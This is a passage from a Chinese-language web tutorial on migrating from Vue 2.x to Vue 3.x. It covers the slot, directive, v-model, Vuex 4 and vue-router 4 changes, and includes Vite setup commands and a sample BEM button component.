    <span><span><span>&lt;</span>div</span> <span>v-if</span><span><span>=</span><span>"</span>show<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>modal<span>"</span></span><span>></span></span><span><span><span>&lt;</span>slot</span> <span>/></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>transition</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>&lt;!-- usage --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>modal</span> <span>:show</span><span><span>=</span><span>"</span>showModal<span>"</span></span><span>></span></span>hello<span><span><span>&lt;/</span>modal</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><div><p>重命名</p>
<p>重命名过滤类 <code>v-enter</code> 重命名成 <code>v-enter-from</code> , <code>v-leave</code> 重命名成 <code>v-enter-from</code> 。</p>
</div>
<div><pre><code><span>.v-enter-from,
.v-leave-to</span> <span>{</span>
  <span>opacity</span><span>:</span> 0<span>;</span>
<span>}</span>

<span>.v-leave-from,
.v-enter-to</span> <span>{</span>
  <span>opacity</span><span>:</span> 1<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="特殊-attribute" tabindex="-1"> 特殊 attribute</h3>
<div><p>删除了</p>
<p><code>slot</code> 、 <code>slot-scope</code> 、 <code>scope</code></p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component-a</span><span>></span></span>
    <span><span><span>&lt;</span>template</span> <span>slot</span><span><span>=</span><span>"</span>header<span>"</span></span> <span>slot-scope</span><span><span>=</span><span>"</span>{ text }<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>template</span><span>></span></span>
  <span><span><span>&lt;/</span>component-a</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中的写法</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>component-a</span><span>></span></span>
    <span><span><span>&lt;</span>template</span> <span><span>v-slot:</span>header</span><span><span>=</span><span>"</span>{ text }<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>template</span><span>></span></span>
    <span>&lt;!-- 也可以使用简写 ---></span>
    <span><span><span>&lt;</span>template</span> <span>#header</span><span><span>=</span><span>"</span>{ text }<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>template</span><span>></span></span>
    <span>&lt;!-- 无作用域时 --></span>>
    <span><span><span>&lt;</span>template</span> <span>#header</span><span>></span></span><span><span><span>&lt;/</span>template</span><span>></span></span>
  <span><span><span>&lt;/</span>component-a</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="事件修饰符" tabindex="-1"> 事件修饰符</h3>
<div><p>删除了</p>
<p><code>.native</code></p>
</div>
<p><code>.native</code> 这个修饰符原本是 vue1.x 版本的, 在 vue2.x 中仍然保留了这个修饰符, 但是在 vue3.x 中这个修饰符已经被完全移除了</p>
<h3 id="内联模板" tabindex="-1"> 内联模板</h3>
<div><p>删除了</p>
<p>内联模板 <code>inline-template</code> 。参考地址：<a href="https://cn.vuejs.org/v2/guide/components-edge-cases.html#%E5%86%85%E8%81%94%E6%A8%A1%E6%9D%BF" target="_blank" rel="noopener noreferrer">内联模板</a></p>
</div>
<p>在 Vue2.x 中, 在父组件引入子组件时, 会用到 inline-template 来使子组件的内容也得到展示, 在 Vue3 中, 这个功能将被移除, 目前 inline-template 使用的并不多。</p>
<h3 id="样式-scoped" tabindex="-1"> 样式 scoped</h3>
<div><p>删除了</p>
<p><code>&gt;&gt;&gt;</code> 和 <code>/deep/</code> 的支持</p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span>/* 深度选择器 */</span>
<span>/*方式一：*/</span>
<span>>>> .foo</span> <span>{</span>
<span>}</span>

<span>/*方式二：*/</span>
<span>/deep/ .foo</span> <span>{</span>
<span>}</span>

<span>/*方式三*/</span>
<span>::v-deep .foo</span> <span>{</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中的写法</p>
<div><pre><code><span>/* 深度选择器 */</span>
<span>::v-deep(.foo)</span> <span>{</span>
<span>}</span>

<span>/* slot content 起作用 */</span>
<span>::v-slotted(.foo)</span> <span>{</span>
<span>}</span>

<span>/* 全局 */</span>
<span>::v-global(.foo)</span> <span>{</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="vue3-x-新增的语法或者-api" tabindex="-1"> vue3.x 新增的语法或者 API</h2>
<div><p>提示</p>
<ul>
<li>下方内容可在官方文档中找到对照：<a href="https://vue3js.cn/docs/guide/migration/introduction.html#overview" target="_blank" rel="noopener noreferrer">迁移至 Vue 3</a></li>
<li>当然也可以在这里找到对照：<a href="https://juejin.im/post/6844904165378883591" target="_blank" rel="noopener noreferrer">vue 3.x 如何有惊无险地快速入门</a></li>
<li>更多的变更提案参考：<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs" target="_blank" rel="noopener noreferrer">Vue RFC</a></li>
</ul>
</div>
<h3 id="composition-api-1" tabindex="-1"> Composition API</h3>
<div><p>文档</p>
<p><a href="https://composition-api.vuejs.org/zh/api.html" target="_blank" rel="noopener noreferrer">Vue 组合式 API</a> 在 vue3.x 中不在提倡 mixins 了, Composition API 的引入是可以替换 mixins：<a href="https://juejin.im/post/6844904136065056781" target="_blank" rel="noopener noreferrer">Vue3 Composition API 如何替换 Vue Mixins</a></p>
</div>
<h3 id="teleport" tabindex="-1"> teleport</h3>
<div><p>文档</p>
<p><a href="https://vue3js.cn/docs/api/built-in-components.html#teleport" target="_blank" rel="noopener noreferrer">teleport</a></p>
</div>
<h3 id="按需引入" tabindex="-1"> 按需引入</h3>
<p>在 vue3.x 中不会把所有的 api 都打包进来, 只会 打包你用到的 api</p>
<div><pre><code><span>// vue 2.x</span>
<span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>

Vue<span>.</span><span>nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>)</span><span>;</span>

<span>const</span> obj <span>=</span> Vue<span>.</span><span>observable</span><span>(</span><span>{</span><span>}</span><span>)</span><span>;</span>

<span>// vue 3.x</span>
<span>import</span> Vue<span>,</span> <span>{</span> nextTick<span>,</span> observable <span>}</span> <span>from</span> <span>"vue"</span><span>;</span>

Vue<span>.</span>nextTick<span>;</span> <span>// undefined</span>

<span>nextTick</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>)</span><span>;</span>

<span>const</span> obj <span>=</span> <span>observable</span><span>(</span><span>{</span><span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="片段" tabindex="-1"> 片段</h3>
<div><p>Overview</p>
<p>在 Vue3 中, 组件现在正式支持多根节点组件, 即片段！</p>
</div>
<p>在 <code>2.x</code> 中, 不支持多根组件, 并且在用户意外创建组件时会发出警告。结果, 许多组件被包装在一个 <code>&lt;div&gt;</code> 中, 以解决此错误。</p>
<div><pre><code><span>&lt;!-- Layout.vue --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span><span><span>&lt;</span>header</span><span>></span></span>...<span><span><span>&lt;/</span>header</span><span>></span></span>
    <span><span><span>&lt;</span>main</span><span>></span></span>...<span><span><span>&lt;/</span>main</span><span>></span></span>
    <span><span><span>&lt;</span>footer</span><span>></span></span>...<span><span><span>&lt;/</span>footer</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 3.x 中, 组件现在可以具有多个根节点！但是, 这确实需要开发人员明确定义属性应在何处分发。</p>
<div><pre><code><span>&lt;!-- Layout.vue --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>header</span><span>></span></span>...<span><span><span>&lt;/</span>header</span><span>></span></span>
  <span><span><span>&lt;</span>main</span> <span>v-bind</span><span><span>=</span><span>"</span>$attrs<span>"</span></span><span>></span></span>...<span><span><span>&lt;/</span>main</span><span>></span></span>
  <span><span><span>&lt;</span>footer</span><span>></span></span>...<span><span><span>&lt;/</span>footer</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="指令的钩子函数" tabindex="-1"> 指令的钩子函数</h3>
<div><p>提示</p>
<p>vue 3.x 将重新命名指令中的 API, 只为了更好的与组件生命周期保持一致</p>
</div>
<p>vue2.x 的自定义指令钩子函数</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>

Vue<span>.</span><span>directive</span><span>(</span><span>"my-directive"</span><span>,</span> <span>{</span>
  <span>bind</span><span>:</span> <span>function</span> <span>(</span><span>el<span>,</span> binding<span>,</span> vnode<span>,</span> oldVnode</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>inserted</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>update</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>componentUpdated</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>unbind</span><span>:</span> <span>function</span> <span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 的自定义指令钩子函数</p>
<div><pre><code><span>import</span> Vue <span>from</span> <span>"vue"</span><span>;</span>
<span>const</span> app <span>=</span> Vue<span>.</span><span>createApp</span><span>(</span><span>{</span><span>}</span><span>)</span><span>;</span>

app<span>.</span><span>directive</span><span>(</span><span>"highlight"</span><span>,</span> <span>{</span>
  <span>beforeMount</span><span>(</span><span>el<span>,</span> binding<span>,</span> vnode<span>,</span> prevVnode</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>beforeUpdate</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>updated</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
  <span>beforeUnmount</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span> <span>// new</span>
  <span>unmounted</span><span>(</span><span>)</span> <span>{</span><span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="指令动态参数" tabindex="-1"> 指令动态参数</h3>
<div><pre><code><span>&lt;!-- 非简写方式 --></span>
<span><span><span>&lt;</span>div</span> <span><span>v-bind:</span>[key]</span><span><span>=</span><span>"</span>value<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>div</span> <span><span>v-on:</span>[event]</span><span><span>=</span><span>"</span>handler<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>foo</span><span>></span></span>
  <span><span><span>&lt;</span>template</span> <span><span>v-slot:</span>[name]</span><span>></span></span> Hello <span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;/</span>foo</span><span>></span></span>

<span>&lt;!-- 简写方式 --></span>
<span><span><span>&lt;</span>div</span> <span>:[key]</span><span><span>=</span><span>"</span>value<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>div</span> <span>@[event]</span><span><span>=</span><span>"</span>handler<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;</span>foo</span><span>></span></span>
  <span><span><span>&lt;</span>template</span> <span>#[name]</span><span>></span></span> Hello <span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;/</span>foo</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="异步组件" tabindex="-1"> 异步组件</h3>
<p>vue2.x 的写法</p>
<div><pre><code><span>// 局部注册</span>
<span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>...</span>rest<span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    <span>a</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>import</span><span>(</span><span>"./components/a.vue"</span><span>)</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
<span>// 全局注册</span>
Vue<span>.</span><span>component</span><span>(</span><span>"async-comp"</span><span>,</span> <span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=></span> <span>(</span><span>{</span>
  <span>component</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>imort</span><span>(</span><span>"./components/a.vue"</span><span>)</span><span>,</span>
  <span>loading</span><span>:</span> loadingComp<span>,</span> <span>//异步组件加载时使用的组件</span>
  <span>error</span><span>:</span> errorComp<span>,</span> <span>//加载失败时使用的组件</span>
  <span>delay</span><span>:</span> <span>200</span><span>,</span> <span>//展示加载时组件的延时时间。默认值是 200 (毫秒)</span>
  <span>timeout</span><span>:</span> <span>3000</span><span>,</span> <span>//如果提供了超时时间且组件加载也超时了, 则使用加载失败时使用的组件。默认值是： `Infinity`</span>
<span>}</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 的写法</p>
<div><pre><code><span>import</span> <span>{</span> defineAsyncComponent <span>}</span> <span>from</span> <span>"vue"</span><span>;</span>

<span>const</span> AsyncComp <span>=</span> <span>defineAsyncComponent</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>import</span><span>(</span><span>"./Foo.vue"</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="v-model" tabindex="-1"> v-model</h3>
<div><p>Overview</p>
<p>在变化方面, 概括地说：</p>
<ul>
<li>
<p>BREAKING：当使用自定义组件时, <code>v-model</code> 的 prop 和事件名称发生了改变：</p>
<ul>
<li>prop: <code>value</code> =&gt; <code>modelValue</code> ;</li>
<li>event: <code>input</code> =&gt; <code>update:modelValue</code> ;</li>
</ul>
</li>
<li>
<p>BREAKING： <code>v-bind</code> 的 <code>.sync</code> 修饰符和组件的 <code>model</code> 选项已经被删除了, 被替换的是 <code>v-model</code> 的绑定值;</p>
</li>
<li>
<p>NEW：现在在同一个组件上可以进行多个 <code>v-model</code> 的绑定;</p>
</li>
<li>
<p>NEW：添加创建自定义 <code>v-model</code> 的修饰器功能;</p>
</li>
</ul>
</div>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>custom-model</span>
    <span><span>v-model:</span>visible</span><span><span>=</span><span>"</span>show<span>"</span></span>
    <span><span>v-model:</span>inputName</span><span><span>=</span><span>"</span>inputName<span>"</span></span>
  <span>></span></span><span><span><span>&lt;/</span>custom-model</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>show</span><span>:</span> <span>false</span><span>,</span>
      <span>inputName</span><span>:</span> <span>""</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="v-is" tabindex="-1"> v-is</h3>
<div><p>Overview</p>
<p>与 vue2.x 中的 <code>&lt;component /&gt;</code> 组件中的 <code>:is</code> 属性是一致的效果</p>
</div>
<div><pre><code><span><span><span>&lt;</span>table</span><span>></span></span>
  <span><span><span>&lt;</span>tr</span> <span>v-is</span><span><span>=</span><span>"</span><span>'</span>blog-post-row<span>'</span><span>"</span></span><span>></span></span><span><span><span>&lt;/</span>tr</span><span>></span></span>
<span><span><span>&lt;/</span>table</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="vuex4-x-的修改" tabindex="-1"> vuex4.x 的修改</h2>
<div><p>提示</p>
<p>既然我们选择使用了 vue3.x, 那么我们也顺便看看 vuex 中的最新版本有哪些变化吧</p>
</div>
<div><p>参考来源</p>
<ul>
<li><a href="https://github.com/vuejs/vuex/tree/4.0" target="_blank" rel="noopener noreferrer">vuex README</a></li>
<li>更多的变更提案参考：<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs" target="_blank" rel="noopener noreferrer">Vue RFC</a></li>
</ul>
</div>
<h3 id="导入方式" tabindex="-1"> 导入方式</h3>
<div><pre><code><span>// 旧版</span>
<span>import</span> Vuex <span>from</span> <span>"vuex"</span><span>;</span>
<span>export</span> <span>default</span> <span>new</span> <span>Vuex<span>.</span>Store</span><span>(</span><span>{</span>
  <span>// ...</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// 新版</span>
<span>import</span> <span>{</span> createStore <span>}</span> <span>from</span> <span>"vuex"</span><span>;</span>
<span>export</span> <span>default</span> <span>createStore</span><span>(</span><span>{</span>
  <span>// ...</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="vue-router4-x-的修改" tabindex="-1"> vue-router4.x 的修改</h2>
<div><p>提示</p>
<p>既然我们选择使用了 vue3.x, 那么我们也顺便看看 vue-router 中的最新版本有哪些变化吧</p>
</div>
<div><p>参考来源</p>
<ul>
<li><a href="https://github.com/vuejs/vue-router-next" target="_blank" rel="noopener noreferrer">vue-router README</a></li>
<li>更多的变更提案参考：<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs" target="_blank" rel="noopener noreferrer">Vue RFC</a></li>
</ul>
</div>
<h3 id="导入方式-1" tabindex="-1"> 导入方式</h3>
<div><pre><code><span>// 旧版</span>
<span>import</span> Router <span>from</span> <span>"vue-router"</span><span>;</span>
<span>export</span> <span>default</span> <span>new</span> <span>Router</span><span>(</span><span>{</span>
  <span>mode</span><span>:</span> <span>"hash"</span><span>,</span>
  <span>// ...</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// 新版</span>
<span>import</span> <span>{</span> createRouter<span>,</span> createWebHistory <span>}</span> <span>from</span> <span>"vue-router"</span><span>;</span>
<span>export</span> <span>default</span> <span>new</span> <span>createRouter</span><span>(</span><span>{</span>
  <span>history</span><span>:</span> <span>createWebHistory</span><span>(</span><span>)</span><span>,</span>
  <span>// ...</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="router-link" tabindex="-1"> router-link</h3>
<p><code>router-link</code> 添加 <code>scoped-slot</code> API 和 custom 属性, 并移除了 tag 属性和 event 属性。添加 <code>scoped-slot</code> 有什么用呢？以前只能通过 active-class 来改变元素样式的, 现在有了 <code>scoped-slot</code> 之后, 我们就更加灵活了, 可以根据 scoped-slot 回传的状态自定义, 不管是样式还是类。</p>
<div><pre><code><span><span><span>&lt;</span>router-link</span> <span>to</span><span><span>=</span><span>"</span>/<span>"</span></span> <span>custom</span> <span>v-slot</span><span><span>=</span><span>"</span>{ href, navigate, isActive }<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>li</span> <span>:class</span><span><span>=</span><span>"</span>{ <span>'</span>active<span>'</span>: isActive }<span>"</span></span><span>></span></span>
    <span><span><span>&lt;</span>a</span> <span>:href</span><span><span>=</span><span>"</span>href<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>navigate<span>"</span></span><span>></span></span>
      <span><span><span>&lt;</span>Icon</span><span>></span></span>home<span><span><span>&lt;/</span>Icon</span><span>></span></span><span><span><span>&lt;</span>span</span> <span>class</span><span><span>=</span><span>"</span>xs-hidden<span>"</span></span><span>></span></span>Home<span><span><span>&lt;/</span>span</span><span>></span></span>
    <span><span><span>&lt;/</span>a</span><span>></span></span>
  <span><span><span>&lt;/</span>li</span><span>></span></span>
<span><span><span>&lt;/</span>router-link</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>复制代码也就是说, 新版本的 Router 就更加的纯粹, 只提供给我们一些参数, 让我们自己利用这些参数来实现不同的场景。</p>
<h3 id="meta-合并" tabindex="-1"> meta 合并</h3>
<p>给定一个嵌套路由</p>
<div><pre><code><span>{</span>
    <span>path</span><span>:</span> <span>'/parent'</span><span>,</span>
    <span>meta</span><span>:</span> <span>{</span>
        <span>requiresAuth</span><span>:</span> <span>true</span><span>,</span>
        <span>isChild</span><span>:</span> <span>false</span>
    <span>}</span><span>,</span>
    <span>children</span><span>:</span> <span>[</span><span>{</span>
        <span>path</span><span>:</span> <span>'child'</span><span>,</span>
        <span>meta</span><span>:</span> <span>{</span>
            <span>isChild</span><span>:</span> <span>true</span>
        <span>}</span>
    <span>}</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>导航到 <code>/parent/child</code> 应该生成具有以下 <code>meta</code> 属性的路由：</p>
<h3 id="路由匹配所有" tabindex="-1"> 路由匹配所有</h3>
<div><pre><code><span>// 旧版</span>
<span>const</span> routes <span>=</span> <span>[</span>
  <span>{</span>
    <span>path</span><span>:</span> <span>"*"</span><span>,</span>
    <span>// ...</span>
  <span>}</span><span>,</span>
<span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// 新版</span>
<span>const</span> routes <span>=</span> <span>[</span>
  <span>{</span>
    <span>path</span><span>:</span> <span>"/:catchAll(.*)"</span><span>,</span>
    <span>// ...</span>
  <span>}</span><span>,</span>
<span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="新增方法" tabindex="-1"> 新增方法</h3>
<ol>
<li><code>router.addRoute(route: RouteRecord)</code> 动态添加路由</li>
<li><code>router.removeRoute(name: string | symbol)</code> 动态删除路由</li>
<li><code>router.hasRoute(name: string | symbol): boolean</code> 判断路由是否存在</li>
<li><code>router.getRoutes(): RouteRecord[]</code> 获取路由列表</li>
</ol>
<h2 id="一如既往的开启-vue3-x" tabindex="-1"> 一如既往的开启 vue3.x</h2>
<p>我们使用官方推荐的 <a href="https://github.com/vitejs/vite" target="_blank" rel="noopener noreferrer">Vite</a> 脚手架</p>
<div><p>提示</p>
<p>关于 Vite Vite 是一个 Web 开发构建工具, 由于其本机 ES 模块导入方法, 因此可以快速提供代码服务。</p>
</div>
<div><pre><code>$ <span>npm</span> init vite-app <span>&lt;</span>project-name<span>></span>
$ <span>cd</span> <span>&lt;</span>project-name<span>></span>
$ <span>npm</span> <span>install</span>
$ <span>npm</span> run dev
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="一个简单的组件" tabindex="-1"> 一个简单的组件</h3>
<div><p>提示</p>
<p>以下提供一个简单的组件供大家学习 vue3.x</p>
</div>
<p><code>bem.js</code></p>
<div><pre><code><span>/**
 * bem helper
 * b() // 'button'
 * b('text') // 'button__text'
 * b(<span>{</span> disabled <span>}</span>) // 'button button--disabled'
 * b('text', <span>{</span> disabled <span>}</span>) // 'button__text button__text--disabled'
 * b(['disabled', 'primary']) // 'button button--disabled button--primary'
 */</span>
<span>export</span> <span>default</span> <span>function</span> <span>(</span><span>ctx</span><span>)</span> <span>{</span>
  <span>const</span> <span>ELEMENT</span> <span>=</span> <span>"__"</span><span>;</span>
  <span>const</span> <span>MODS</span> <span>=</span> <span>"--"</span><span>;</span>

  <span>const</span> <span>join</span> <span>=</span> <span>(</span><span>name<span>,</span> el<span>,</span> symbol</span><span>)</span> <span>=></span> <span>(</span>el <span>?</span> name <span>+</span> symbol <span>+</span> el <span>:</span> name<span>)</span><span>;</span>

  <span>const</span> <span>prefix</span> <span>=</span> <span>(</span><span>name<span>,</span> mods</span><span>)</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>typeof</span> mods <span>===</span> <span>"string"</span><span>)</span> <span>{</span>
      <span>return</span> <span>join</span><span>(</span>name<span>,</span> mods<span>,</span> <span>MODS</span><span>)</span><span>;</span>
    <span>}</span>

    <span>if</span> <span>(</span>Array<span>.</span><span>isArray</span><span>(</span>mods<span>)</span><span>)</span> <span>{</span>
      <span>return</span> mods<span>.</span><span>map</span><span>(</span><span>(</span><span>item</span><span>)</span> <span>=></span> <span>prefix</span><span>(</span>name<span>,</span> item<span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>const</span> ret <span>=</span> <span>{</span><span>}</span><span>;</span>
    Object<span>.</span><span>keys</span><span>(</span>mods <span>||</span> <span>{</span><span>}</span><span>)</span><span>.</span><span>forEach</span><span>(</span><span>(</span><span>key</span><span>)</span> <span>=></span> <span>{</span>
      ret<span>[</span>name <span>+</span> <span>MODS</span> <span>+</span> key<span>]</span> <span>=</span> mods<span>[</span>key<span>]</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
    <span>return</span> ret<span>;</span>
  <span>}</span><span>;</span>

  <span>const</span> <span>b</span> <span>=</span> <span>(</span><span>el<span>,</span> mods</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> <span>{</span> name <span>}</span> <span>=</span> ctx<span>;</span>

    <span>if</span> <span>(</span>el <span>&amp;&amp;</span> <span>typeof</span> el <span>!==</span> <span>"string"</span><span>)</span> <span>{</span>
      mods <span>=</span> el<span>;</span>
      el <span>=</span> <span>""</span><span>;</span>
    <span>}</span>
    el <span>=</span> <span>join</span><span>(</span>name<span>,</span> el<span>,</span> <span>ELEMENT</span><span>)</span><span>;</span>

    <span>return</span> mods <span>?</span> <span>[</span>el<span>,</span> <span>prefix</span><span>(</span>el<span>,</span> mods<span>)</span><span>]</span> <span>:</span> el<span>;</span>
  <span>}</span><span>;</span>

  <span>return</span> <span>{</span>
    b<span>,</span>
  <span>}</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>button.js</code></p>
<div><pre><code><span>import</span> <span>{</span> defineComponent<span>,</span> toRefs <span>}</span> <span>from</span> <span>"vue"</span><span>;</span>
<span>import</span> bem <span>from</span> <span>"@/utils/bem"</span><span>;</span>

<span>const</span> button <span>=</span> <span>defineComponent</span><span>(</span><span>{</span>
  <span>name</span><span>:</span> <span>"button"</span><span>,</span>

  <span>props</span><span>:</span> <span>{</span>
    <span>type</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> String<span>,</span>
      <span>default</span><span>:</span> <span>"primary"</span><span>,</span>
      <span>validator</span><span>(</span><span>val</span><span>)</span> <span>{</span>
        <span>return</span> <span>(</span>
          <span>[</span><span>"success"</span><span>,</span> <span>"info"</span><span>,</span> <span>"warning"</span><span>,</span> <span>"danger"</span><span>,</span> <span>"primary"</span><span>]</span><span>.</span><span>indexOf</span><span>(</span>val<span>)</span> <span>!==</span>
          <span>-</span><span>1</span>
        <span>)</span><span>;</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
    <span>disabled</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> Boolean<span>,</span>
      <span>default</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>setup</span><span>(</span><span>props<span>,</span> <span>{</span> slots<span>,</span> emit <span>}</span></span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> b <span>}</span> <span>=</span> <span>bem</span><span>(</span>button<span>)</span><span>;</span>
    <span>// 注意这里的 props 是一个 Proxy 对象, 我们需要将其转换成普通对象才能对其进行使用</span>
